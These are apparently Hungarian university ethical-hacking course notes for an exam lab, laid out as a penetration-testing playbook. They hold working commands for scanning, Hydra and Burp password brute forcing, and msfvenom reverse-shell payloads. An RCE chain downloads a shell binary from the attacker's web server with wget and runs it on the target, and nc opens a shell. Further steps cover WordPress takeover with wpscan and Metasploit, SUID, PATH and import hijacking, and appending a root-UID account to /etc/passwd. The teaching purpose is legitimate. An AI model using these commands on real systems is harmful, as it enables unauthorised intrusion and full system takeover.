------
Más jegyzete: https://github.com/rol2005hun/DE-IK/tree/main/4.félév/ethack
------

ethack.infra.inf.unideb.hu
Student<szám> (felhasználónév és jelszó)
vnc.html-ben Stud<szám>

Jelszavaknál: 5000 próbálkozásnál több nem kell

------------------------------------------------------------------------
1. fázis
------------------------------------------------------------------------

Nmap
!!Általában nmap -sS -sV <IP> -- a kezdő parancs
 <IP> -- infókat mond az ip-ről
 -sn <IP tart> -- ip felderítés
 -p <port/tartomány> <IP> -- portok tesztelés -p- az összes, -sU az UDP-t is nézi
 -sS -- syn scan (stealth scan)
 -sV -- megnézzük mi fut a porton
 -O -- OS scan, tipp
 -T0...5 -- timing, alapból 3, ne nagyon változtassuk, nagyobb gyorsabb
 -Pn -- ping no, ha szerinte ki van kapcsolva de tudjuk hogy be van kapcsolva az eszköz akkor csináljuk
 --script ssh -- scriptek futtatása, vulnerabilitykhez, --script safe nem omlaszt össze rendszereket

TCP akkor is válaszol ha zárva van, UDP-nél nem tudhatjuk
Nmap által porthoz rendelt service nem feltétlen helyes
ctrl+l terminál törlés

netcat: nc
 -lvp 4444 -- 4444-es porton listenert nyit
 -v ip:port -- csatlakozás az ip:porthoz
 -e /bin/bash -- speciális nc kell hozzá, execute jog is, így jutunk be egy gépre úgy hogy shellbe is tudjunk írni

msfvenom
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

cs:64bit linux stageless non-meterpreter

stageless: felteszel egy fájlt és csinál egy shell-t, nc-vel működik
staged: több fázisú, főleg kommunikál, nc-vel nem működika
meterpreter: nem működik nc-vel

Aloldalkeresés:
dirb vagy dirbuster
dirb <ip> <wordlist>: (órán /usr/share/wordlists/dirb/common.txt , valóságban ez kevés)
 -r -- alapból rekurzív, ez a nem rekurzívan
 -R -- interaktívan rekurzívan
 -u <username:password> -- felhasználónév/jelszó
 -x <fájl> -- kiterjesztés próbálgatás, a kiterjesztések egy fájlban listázva;
 -X <.png .jpg> -- -x-hez hasonló, itt megadjuk a kiterjesztéseket pl. .php <- hasznos!!

dirbuster
 url, thread-ek maradhatnak, wordlist (fentebbi jó), rekurziót kivenni, lehet fájlkiterjesztéseket állítani -> results és megnézzük a kódokat, pl. 401-es kód
 options, advanced options, authentication

BasicAuth/HTTP.get auth/Post auth - alap auth weben

Hydra: bármilyen jelszó feltöréséhez lehet használni
 jelszófájl: /usr/share/wordlists/rockyou.txt
 -l <név> vagy -L <névfájl>
 -p <jelszó> vagy -P <jelszófájl>
 -f -- megáll az első találatnál
 végére meg <service>://<ip>:<port>/<elérésiútvonal> vagy <ip>:<port> <service> /<elérésiútvonal>, pl. http-get://40.0.3.12/admin ha basic auth van

Weboldaloknál lehetséges sérülékenységek:
 - feltöltési résznél ha nincs fájlkiterjesztés jól limitálva
 - DT (Directory Traversal) letöltési résznél ha a .php fájlra hivatkozik a címsorban amit módosítani tudunk (ehhez ismerni kell a mappastruktúrát)
   - ennek a sérülékenysége az LFI (Local File Inclusion)

ha megvan a feltöltési sérülékenység:
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
ezt feltöltjük, listenert indítunk a gépünkön, futtatjuk a feltöltött phpt, és ezután van hozzáférésünk (php shell problémái: nem mindig működik, egy idő után megszakad, és nem interaktív (pl. jelszókérésnél))
php shell-ről továbblépés a command shell (pl. azon a shell-en letöltünk egy másik shell-t), egyetlen parancsot futtat
command shell:
 - php exec manual böngészőben, első example-t kimásoljuk
   <?php
   $output=null;
   $retval=null;
   exec('whoami', $output, $retval);
   echo "Returned with status $retval and output:\n";
   print_r($output);
   ?>

RCE (Remote Code Execution) sérülékenység kihasználása:
 - előfeltételek:
   - Attacker gépen OS shellkód készítése (célpont OS-ére, nekünk linux x64) (msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf)
           https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ ; cs:64bit linux stageless non-meterpreter
   - Attacker gépen: python3 -m http.server (nem kell, de lehet port) -- webszerver nyitása !!abból a mappából ahol a shellkód van!!
   - Attacker gépen listener nyitása (külön terminálban kényelmesebb) (nc -lvp 4444)
 - CMD rész: (lépések között ls -l /tmp -vel tesztelhetjük a mappastruktúrát)
   - cd /tmp -- olyan mappa ahol van jogosultságunk letölteni
   - rm -f /tmp/shell.elf -- shell neve változhat
   - wget http://<AttackerIP>:<előfeltétel portja, alapból 8000>/shell.elf
   - chmod +x /tmp/shell.elf
   - /tmp/shell.elf

Fenti parancsok egy php fájlba, ami githubon is fent van.
Ebből interaktív shell-t úgy csinálunk hogy "python3 -c "import pty;pty.spawn('/bin/bash')""

Wordpress oldalak:
wpscan: (!!sudo wpscan!!)
 --url <ip> -- mindig kezdőoldal kell
 --enumerate u/vp/ap/vt/at/dbe -- több opció, users, vulnerable/all plugins, all themes, database exports
(biztonsági lépés, wp-content és hasonló mappák átnevezése)
 --random-agent -- minden kérés random agent
 --usernames <nevek> --passwords <jelszavak> --lehetnek fájlok is, feltörésre, nem "kézzel bruteforce-ol", máshol próbál bejelentkezni mint egy felhasználó
 --wp-content-dir -- a wp-content mappa neve ha tudjuk

jelszófájl leredukálása csak 5000 sornyira: cat /usr/share/wordlists/rockyou.txt | head -n5000 > /tmp/rockyou5000.txt

Sérülékenységek külső oldalról:
  -keresünk https://www.exploit-db.com/ oldalon sérülékenységet (cross-site scripting nem jó, minél újabbat keresünk, pipásnak kell lennie)
  -letöltjük a megfelelő .py file-t
  -terminálban elindítjuk a jó paraméterrel (egyszer elindítod elmondja hogy kell) (python3 <fájlnév>)
  -ki cat-eled a .py fájlt és a végén elmondja mit csinált (pl. új admin felhasználót hoz létre) (ha parancsokat kell megadni akkor idézőjel használata kötelező több parancsnál)

(verziókeresés: oldalaknál jobb klikk és view page source, ott pl. sok résznél a verziószám, vagy a pontos rész verziószáma, esetleg belépés után pl. phpmyadmin megmondja)


Jelszófeltörés ha nem wordpress és nem basic auth: (pl. saját oldalnál)
 - burp suite community edition ((ehhez proxyt is kellene állítani, vizsgán be lesz állítva alapból (foxyproxy)))
((lehet ezzel legördülő menüket is kijátszani))
  - webkéréseimet megnézhetem és akár módosíthatom is
  - foxyproxy: options, name, 127.0.0.1, 8080 ((ha nem használjuk akkor kapcsoljuk ki))
  - burp: intercept on
  - megpróbálunk bejelentkezni valamin
  - a burp elfogja és meg tudjuk nézni, módosítani, továbbítani
   - jobb klikk, send to repeater, repeater-ben tudjuk nézni milyen választ kapunk, és át tudjuk írni ezeket
   - jobb klikk, send to intruder, kijelölöm a jelszót, add, megadjuk a jelszavakat/jelszófájlt (meg felhasználónevet is lehet add-olni) (sniper attack (vizsgán), clusterbomb attack, stb.)
    - abból tudhatjuk hogy melyik sikerült: státuszkód és a válasz hossza

------------------------------------------------------------------------
2. fázis
------------------------------------------------------------------------
linpeas; winpeas - infógyűjtő linuxos/windowsos gépről, az áldozat gépére kell felrakni, valóságban hasznos, zh-ban nem hasznos

Cél a felhasználóváltás minél nagyobb jogokhoz

cat /etc/passwd
fontosak: root és minden emberi felhasználó

minden felhasználóváltás során érdemes végrehajtani:
 -sudo -l -- tudok-e más nevében futtatni parancsokat
 -find / -perm -u=s -type f 2>/dev/null -- SUID bit keresése ((vagy -u-s?))
  -https://gtfobins.github.io/ -- melyik parancsokat lehet ezekből kihasználni, SUID bit részt keressük
  -összehasonlítjuk a saját (nem feltörhető) géppel, és a különböző állományokra figyelünk
  -ha találunk jó fájlt akkor azt futtatjuk a gtfobins-nek megfelelő paranccsal
 -jogosultságok:
  -/etc/passwd -- passwd második értéke a jelszó (x vagy encrypted)
   -ha találunk valakit pl. passwd-ben, akkor létrehozhatunk egy új fájlt a következő bejegyzésformával, <Név>:<HASH>:<ID>:<GID>:<COMMENT>:<HOME_MAPPA>:<SHELL> (hash-hez egy olyan hash-t használunk amit már ismerünk, id és gid lehet 0 hogy root-ok legyünk)
   -jelszótörés: sudo john <passwd sor típusú fájl> --wordlist=<wordlist> (--format=crypt)
    -crypt típusa az a $y kezdéstől függ, ha nincs $y akkor nem kell semmi, ha $y a kezdés akkor --format=crypt
   -/etc/shadow
  -jogosultságok végén a "+" jel az ACL:
   -getfacl /etc/passwd -- meg tudjuk nézni az ezen belüli jogosultságokat
((bob: kingkong jelszó))
((  - sudo -u juliet /usr/bin/python3 /home/bob/pwesent_from_juliet.py ))
  - ha tud futtatni egy .py fájlt akkor azt ki tudjuk használni az import kijátszásával (elsőnek ugyan abból a mappából keresi az importálandó fájlt)
   - pl. echo 'print("Feltortelek!!!!")' > random.py ((idézőjelek és hogy milyen idézőjelek az fontos))
   - pl. echo 'import pty;pty.spawn("/bin/bash")' > random.py -- ezzel konkrétan átlépünk juliet fiókjába
  - ha találunk egy .c fájlt (forráskód fájlt), azt tudjuk futtatni/cat-elni hogy megnézzük van-e benne egy parancs (chatgpt-nek is lehet megadni kimenetet hogy megtudjuk)
(( ghydra használható arra hogy már lefordított fájlt reverse engineer-ezzünk, de ez vizsgán nem kell))
(( védekezni úgy lehet ha minden programot/parancsot abszolút útvonallal hívunk meg, vagy a script elején: "export PATH=/usr/bin:/bin"))
   - innen már tudunk szórakozni a környezeti változókkal, PATH exploitation
    - pl. echo 'bash' > df
    - chmod +x df
    - echo $PATH
((felülírjuk az export paranccsal hogy hol keresse az ilyen shell-eket))
    - export PATH=/home/juliet:$PATH
    - így már a mi shell scriptünket futtatja az eredeti script
  - ha rendszergazdák vagyunk valamilyen formában és írhatjuk a /etc/passwd állományt akkor a következőt tegyük bele:
   - hacker:JELSZO:0:0:hacker user:/root:/bin/bash
   - JELSZO elkészítése (itt a jelszó alma): támadó gépen, openssl passwd -5 alma
   - pl. echo 'hacker:$5$mjvl4ma9qOzNAG1k$xqfLO63MmEsNB7bNPky/a5TOPikEXkSMPN.Yw7PMA.4:0:0:hacker user:/root:/bin/bash' >> /etc/passwd
   (( nehogy >-t írjunk >> helyett, a gép nem működne utána, ' idézőjel pedig szintén fontos))
   - ezután már tényleges root-ok lehetünk, csak átváltunk a hacker felhasználónkra, és teljes hozzáférésünk van a gép minden részéhez
(( oldal alján a tanár által leírva ugyan ez a passwd rész))


------------------------------------------------------------------------
Példák:
------------------------------------------------------------------------
1. fázis példák
Példa wordpress oldal feltörésre:
 -sudo nmap -sS -sV <ip>
 -wpscan --url <url> --enumerate u/ap/at
 -wpscan --url <url> --usernames <> --passwords <>
  -keresünk php fájlt és beleírjuk az RCE CMD részét (kitörölhetjük az egészet és kicserélhetjük a miénkkel)
  -RCE előfeltételei
  -bent vagyunk, python3 -c "import pty;pty.spawn('/bin/bash')" az interaktív shell-hez
 VAGY
  -msfconsole -q
  -search wordpress admin shell
  -use 0 (szám változhat, wordpress admin shell upload)
  -!!automatikusan indít listenert!!
  -options
  -Required yes részeket kell megírni (ami helytelen/üres), set username admin; set password finalfantasy; set rhosts 40.0.4.10; etc.
  -run; ha hibára fut akkor lépjünk be manuálisan és erősítsük meg az emailt, majd próbáljuk újra (vagy lehet hiba ha rossz jogosultságú fiókkal akarunk belépni)
  -innentől bent vagyunk
  -shell parancs csinál shell-t, python3 -c "import pty;pty.spawn('/bin/bash')" csinál ebből interaktívat

 VAGY plugin alapján
  -keresünk https://www.exploit-db.com/ oldalon sérülékenységet (cross-site scripting nem jó, minél újabbat keresünk, pipásnak kell lennie)
  -letöltjük a megfelelő .py file-t
  -terminálban elindítjuk a jó paraméterrel (egyszer elindítod elmondja hogy kell) ((pma pmapass volt órán))
  -ki cat-eled a .py fájlt és a végén elmondja mit csinált (pl. új admin felhasználót hoz létre)
  -többi példa alapján, miután van admin fiókunk

2. fázis példák




---------------------------------------
Tanár passwd része
---------------------------------------
HA IRHATJUK A /etc/passwd ALLOMANYT:
 
Ezt adjuk hozza a /etc/passwd vegehez:
 
hacker:JELSZO:0:0:hacker user:/root:/bin/bash
 
JELSZO elkeszitese a tamado gepen (a jelszo itt most alma lesz):
openssl passwd -5 alma
 
A nalam elkeszult jelszo: $5$J3duGPV3dWN.YVO2$zrMkCO1ljY2t.EamYPeOYd.xnidpX.sBlUWRR53QN22
 
Igy a vegleges parancs (nagyon fontos, hogy az echo utan egyszeres '-et hasznaljunk):
 
ELV: echo 'blabla' >> /etc/passwd
 
 
echo 'hacker:$5$J3duGPV3dWN.YVO2$zrMkCO1ljY2t.EamYPeOYd.xnidpX.sBlUWRR53QN22:0:0:hacker user:/root:/bin/bash' >> /etc/passwd

